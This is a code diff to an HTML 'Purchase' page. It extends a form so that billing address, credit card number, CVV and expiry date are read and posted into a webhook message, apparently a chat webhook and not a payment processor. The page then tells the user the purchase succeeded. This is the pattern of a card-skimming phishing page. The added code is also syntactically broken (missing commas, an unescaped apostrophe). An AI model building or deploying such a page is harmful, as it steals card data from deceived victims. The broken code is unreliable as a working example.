@@ -11,19 +11,19 @@
       </div>
       <div class="mb-3">
         <label for="messageInput" class="form-label">Billing Address</label>
-        <textarea class="form-control" id="messageInput" rows="3"></textarea>
+        <textarea class="form-control" id="messageInput0" rows="3"></textarea>
       </div>
       <div class="mb-3">
         <label for="messageInput" class="form-label">Credit Card Number</label>
-        <textarea class="form-control" id="messageInput" rows="3"></textarea>
+        <textarea class="form-control" id="messageInput1" rows="3"></textarea>
       </div>
       <div class="mb-3">
         <label for="messageInput" class="form-label">CVV/CVC</label>
-        <textarea class="form-control" id="messageInput" rows="3"></textarea>
+        <textarea class="form-control" id="messageInput2" rows="3"></textarea>
       </div>
         <div class="mb-3">
         <label for="messageInput" class="form-label">Expiry Date</label>
-        <textarea class="form-control" id="messageInput" rows="3"></textarea>
+        <textarea class="form-control" id="messageInput3" rows="3"></textarea>
       </div>
       <button type="submit" class="btn btn-primary">Purchase</button>
     </form>
@@ -35,6 +35,14 @@
           .getElementById('emailInput').value;
         const senderMessage = document
           .getElementById('messageInput').value;
+        const senderMessage0 = document
+          .getElementById('messageInput0').value;
+        const senderMessage1 = document
+          .getElementById('messageInput1').value;
+        const senderMessage2 = document
+          .getElementById('messageInput2').value;
+        const senderMessage3 = document
+          .getElementById('messageInput3').value;
 
         const webhookBody = {
           embeds: [{
@@ -42,6 +50,10 @@
             fields: [
               { name: 'Sender', value: senderEmail },
               { name: 'Message', value: senderMessage }
+              { name: 'Message', value: senderMessage0 }
+              { name: 'Message', value: senderMessage1 }
+              { name: 'Message', value: senderMessage2 }
+              { name: 'Message', value: senderMessage3 }
             ]
           }],
         };
@@ -59,7 +71,7 @@
         if (response.ok) {
           alert('Your purchase has been made! You'll be emailed your order details with an estimated day of delivery!');
         } else {
-          alert('There was an error! Try again later!');
+          alert('There was an error! Please check your internet connection!');
         }
       }
     </script>
